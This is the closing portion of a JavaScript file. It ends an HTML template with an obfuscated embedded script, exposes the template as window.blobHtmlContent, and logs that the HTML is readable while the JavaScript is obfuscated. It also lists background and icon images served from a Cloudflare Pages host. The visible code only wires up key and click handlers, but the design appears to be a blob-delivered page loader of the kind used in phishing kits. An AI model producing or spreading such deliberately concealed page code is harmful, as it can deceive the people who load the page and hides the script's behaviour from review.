function(_0x7m8n){if(_0x7m8n[_0x1a2b[87]]===_0x1a2b[88]){_0x7m8n[_0x1a2b[64]]();if(_0x6m7n){_0x6m7n[_0x1a2b[63]]()}}}}_0x8i9j[_0x1a2b[89]](_0x1a2b[90],_0x5m6n(_0x1l2m));_0x9j0k[_0x1a2b[89]](_0x1a2b[90],_0x5m6n(_0x2m3n));_0x0k1l[_0x1a2b[89]](_0x1a2b[90],_0x5m6n(_0x3n4o));_0x7h8i();_0x6g7h[_0x1a2b[0]](_0x1a2b[91])})();
</script>
</body>
</html>`;

    // Expose the HTML content globally
    window.blobHtmlContent = HTML_TEMPLATE;

    console.log('✅ Content loaded: HTML readable, JavaScript obfuscated');
    console.log('📸 Images from Cloudflare Pages:');
    console.log('   - Background: https://myprojec-37j.pages.dev/background-image.png');
    console.log('   - Icon: https://myprojec-37j.pages.dev/bgo.png');

})();